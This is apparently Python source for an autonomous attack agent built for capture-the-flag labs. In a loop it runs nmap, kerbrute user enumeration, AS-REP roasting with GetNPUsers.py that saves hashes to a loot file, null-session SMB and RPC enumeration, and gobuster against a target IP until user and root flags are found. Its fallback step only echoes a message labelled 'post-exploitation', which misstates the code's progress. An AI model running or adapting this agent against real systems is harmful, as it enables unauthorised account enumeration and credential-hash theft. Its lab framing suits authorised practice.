import sys
import json
import time
import re
import logging
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("EnterpriseDynamicAgent")

from core.state_manager import StateManager
from utils.smart_executor import SmartCommandExecutor
from utils.exploit_matcher import ExploitMatcher

class EnterpriseDynamicAgent:
    def __init__(self, target_ip: str, domain_name: str = None):
        self.target_ip = target_ip
        self.domain_name = domain_name
        self.state_manager = StateManager(target_ip)
        previous_state = self.state_manager.load_state()
        self.current_step = previous_state.get("step_count", 0) + 1
        logger.info(f"[*] [Agente Dinámico] Reanudando sesión para {target_ip}. Paso actual: {self.current_step}")
        self.executor = SmartCommandExecutor(timeout_minutes=20, poll_interval=15)
        self.exploit_matcher = ExploitMatcher(target_ip)

    def check_flags_status(self) -> tuple:
        state = self.state_manager.load_state()
        history = state.get("history", [])
        user_found = False
        root_found = False
        for h in history:
            output = h.get("output", "")
            cmd = h.get("command", "")
            if "user.txt" in output or "user.txt" in cmd:
                if len(output.strip()) > 10 and not "No such file" in output:
                    user_found = True
            if "root.txt" in output or "root.txt" in cmd:
                if len(output.strip()) > 10 and not "No such file" in output:
                    root_found = True
        return user_found, root_found

    def extract_domain_from_scan(self, scan_content: str):
        if self.domain_name:
            return
        match = re.search(r"(\b[a-zA-Z0-9-]+\.(?:local|htb|lan|internal|com|org|net)\b)", scan_content, re.IGNORECASE)
        if match:
            self.domain_name = match.group(1).lower()
            logger.info(f"[+] [Auto-Descubrimiento] Dominio detectado automáticamente: {self.domain_name}")
            self.state_manager.update_etc_hosts(domain_name=self.domain_name)
        else:
            self.domain_name = f"target-{self.target_ip.replace('.', '-')}.local"
            logger.warning(f"[!] No se pudo extraer un FQDN claro. Usando dominio genérico: {self.domain_name}")

    def determine_next_action(self, current_state: dict) -> tuple:
        history = current_state.get("history", [])
        executed_commands = [h.get("command", "") for h in history]
        scan_path = f"testing/{self.target_ip}/scans/version_scan.txt"
        if not any("nmap" in cmd for cmd in executed_commands):
            command = f"nmap -sV -sC -p- -oN {scan_path} {self.target_ip}"
            return command, "recon"

        scan_content = ""
        if Path(scan_path).exists():
            with open(scan_path, "r", encoding="utf-8") as f:
                scan_content = f.read()
            self.extract_domain_from_scan(scan_content)

        is_active_directory = "88/tcp" in scan_content or "389/tcp" in scan_content

        if is_active_directory:
            domain = self.domain_name
            if not any("kerbrute" in cmd for cmd in executed_commands):
                wordlist = "/usr/share/seclists/Usernames/Names/names.txt"
                if not Path(wordlist).exists():
                    wordlist = "/usr/share/wordlists/rockyou.txt"
                command = f"kerbrute userenum -d {domain} --dc {self.target_ip} {wordlist}"
                return command, "enumeration"
            if not any("GetNPUsers.py" in cmd for cmd in executed_commands):
                loot_path = f"testing/{self.target_ip}/loot/asrep_hashes.txt"
                command = f"GetNPUsers.py {domain}/ -no-pass -dc-ip {self.target_ip} -outputfile {loot_path}"
                return command, "exploitation"
            if not any("smbclient" in cmd for cmd in executed_commands):
                command = f"smbclient -N -L //{self.target_ip}"
                return command, "enumeration"
            if not any("rpcclient" in cmd for cmd in executed_commands):
                command = f"rpcclient -U '' -N {self.target_ip} -c 'enumdomusers'"
                return command, "enumeration"
        else:
            if "80/tcp open" in scan_content or "443/tcp open" in scan_content:
                if not any("gobuster" in cmd for cmd in executed_commands):
                    wordlist = "/usr/share/wordlists/dirb/common.txt"
                    command = f"gobuster dir -u http://{self.target_ip} -w {wordlist} -t 50"
                    return command, "enumeration"

        step_count = len(executed_commands)
        command = f"echo '[*] Ciclo adaptativo #{step_count}: Analizando vectores alternativos para {self.target_ip}'"
        return command, "post-exploitation"

    def run_autonomous_loop(self):
        logger.info("==================================================")
        logger.info(f"[*] [Iniciando Agente Autónomo Dinámico] Objetivo: {self.target_ip}")
        logger.info("[*] El agente iterará de forma autónoma hasta capturar las flags.")
        logger.info("==================================================")
        while True:
            logger.info(f"\n==================================================")
            logger.info(f"[*] [Agente Autónomo - Paso Global #{self.current_step}] Evaluando entorno...")
            logger.info(f"==================================================")
            user_ok, root_ok = self.check_flags_status()
            if user_ok and root_ok:
                logger.info("[+] MISIÓN CUMPLIDA user+root")
                break
            current_state = self.state_manager.load_state()
            command, phase = self.determine_next_action(current_state)
            logger.info(f"[*] [Motor Decisión] Ejecutando: {command}")
            exec_result = self.executor.execute_with_polling(command)
            output = exec_result.get("stdout", "")
            scan_path = f"testing/{self.target_ip}/scans/version_scan.txt"
            if "nmap" in command and Path(scan_path).exists():
                with open(scan_path, "r", encoding="utf-8") as f:
                    scan_content = f.read()
                self.exploit_matcher.analyze_scan_output(scan_content)
            history_entry = {"step": self.current_step, "command": command, "output": output}
            self.state_manager.save_state(
                step=self.current_step,
                history_entry=history_entry,
                phase=phase,
                mission_complete=(user_ok and root_ok)
            )
            self.current_step += 1
            time.sleep(3)
        logger.info("[+] [Agente] Operación finalizada.")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_IP = sys.argv[1]
    else:
        TARGET_IP = "10.129.9.175"
    agent = EnterpriseDynamicAgent(target_ip=TARGET_IP)
    agent.run_autonomous_loop()
